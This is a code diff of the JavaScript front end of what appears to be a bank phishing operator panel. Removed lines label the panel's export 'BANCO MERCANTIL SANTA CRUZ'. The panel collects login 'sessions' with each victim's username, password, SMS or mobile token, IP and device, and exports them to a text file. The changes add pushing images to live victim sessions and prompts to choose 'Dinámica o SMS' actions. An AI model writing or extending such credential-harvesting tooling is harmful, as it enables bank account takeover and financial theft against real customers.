+    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+    
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.4);
+  } catch (_) {}
+}
+
 btnClean?.addEventListener('click', async () => {
-  if (!confirm('¿Seguro que deseas limpiar la cola de sesiones?')) return;
-  rows.clear();
+  rows.clear()
   try {
     await fetch('/api/clear', { method: 'POST' });
   } catch (_) {}
-  render();
-});
+  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
+  render()
+})
 
-// Export to TXT
-btnExport?.addEventListener('click', () => {
+function exportToNotepad() {
   const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
   if (list.length === 0) {
-    alert('No hay información en el panel para guardar.');
+    alert("No hay información en el panel para guardar.");
     return;
   }
 
-  let text = `========================================================\r\n`;
-  text += `REPORTE DE OPERACIONES - BANCO MERCANTIL SANTA CRUZ\r\n`;
-  text += `Fecha de descarga: ${new Date().toLocaleString('es-BO')}\r\n`;
-  text += `Total de sesiones: ${list.length}\r\n`;
-  text += `========================================================\r\n\r\n`;
-
+  let text = "";
   list.forEach((row, i) => {
-    text += `[#${i + 1}] SESIÓN ID: ${row.id}\r\n`;
-    text += `Hora: ${new Date(row.createdAt).toLocaleString('es-BO')}\r\n`;
-    text += `Carril: ${LANE_NAMES[laneForIndex(row.index)]}\r\n`;
+    text += `=== SESION #${i + 1} ===\r\n`;
+    text += `Fecha/Hora: ${new Date(row.createdAt).toLocaleString('es-CO')}\r\n`;
+    text += `Tipo: ${row.tipo}\r\n`;
     text += `Dispositivo: ${row.device}\r\n`;
     text += `IP: ${row.ip}\r\n`;
     text += `Usuario: ${row.user}\r\n`;
-    text += `Contraseña: ${row.clave}\r\n`;
-    text += `Clave Móvil / SMS: ${row.token || '—'}\r\n`;
-    text += `Estado: ${statusLabel(row.state)}\r\n`;
-    text += `--------------------------------------------------------\r\n\r\n`;
+    text += `Clave: ${row.clave}\r\n`;
+    text += `Token: ${row.token || '—'}\r\n`;
+    text += `Estado final: ${statusLabel(row.state)}\r\n`;
+    text += `========================\r\n\r\n`;
   });
 
-  const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
   const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
+  const a = document.createElement("a");
   a.href = url;
-  a.download = `sesiones_bmsc_${Date.now()}.txt`;
+  a.download = `sesiones_panel_${Date.now()}.txt`;
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
   URL.revokeObjectURL(url);
+}
+
+btnExport?.addEventListener('click', () => {
+  exportToNotepad();
 });
 
-// Polling interval 1.5s
-window.setInterval(pollSessions, 1500);
+// ==========================================
+// IMAGE PROCESSING & MANAGEMENT (DRAG & DROP)
+// ==========================================
+function processImageFile(file, maxWidth = 320, maxHeight = 320) {
+  return new Promise((resolve, reject) => {
+    if (!file || !file.type.startsWith('image/')) {
+      return reject(new Error('Por favor selecciona o arrastra un archivo de imagen válido (PNG, JPG, WEBP).'));
+    }
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const img = new Image();
+      img.onload = () => {
+        let { width, height } = img;
+        if (width > maxWidth || height > maxHeight) {
+          const ratio = Math.min(maxWidth / width, maxHeight / height);
+          width = Math.round(width * ratio);
+          height = Math.round(height * ratio);
+        }
+        const canvas = document.createElement('canvas');
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(img, 0, 0, width, height);
+        const isPng = file.type === 'image/png';
+        const dataUrl = canvas.toDataURL(isPng ? 'image/png' : 'image/jpeg', 0.85);
+        resolve(dataUrl);
+      };
+      img.onerror = () => reject(new Error('No se pudo decodificar la imagen'));
+      img.src = e.target.result;
+    };
+    reader.onerror = () => reject(new Error('Error al leer el archivo'));
+    reader.readAsDataURL(file);
+  });
+}
 
-// Initial start
-updateAudioUI();
+async function updateSessionImage(rowId, dataUrl) {
+  const row = rows.get(rowId);
+  if (row) {
+    row.customImage = dataUrl;
+    render();
+  }
+  try {
+    await fetch(`/api/sessions/${rowId}/image`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: dataUrl })
+    });
+    hint.textContent = dataUrl
+      ? `Imagen enviada con éxito a ${row?.user || rowId}`
+      : `Imagen eliminada de ${row?.user || rowId}`;
+  } catch (err) {
+    console.error('Error al actualizar imagen de sesión:', err);
+  }
+}
+
+// Poll sessions every 2 seconds
+window.setInterval(pollSessions, 2000)
+
+// Initial load
 pollSessions().then(() => {
-  isInitialLoad = false;
+  isInitialLoad = false; // Initial fetch completed, enable sound notifications
+  updateAudioUI(); // Ensure toggle button reflects correct state on load
+  hint.textContent = rows.size
+    ? `En cola: ${rows.size}. Elige Dinámica o SMS en Acciones.`
+    : 'Esperando usuarios del login… Al ingresar llegan aquí ordenados.'
 });
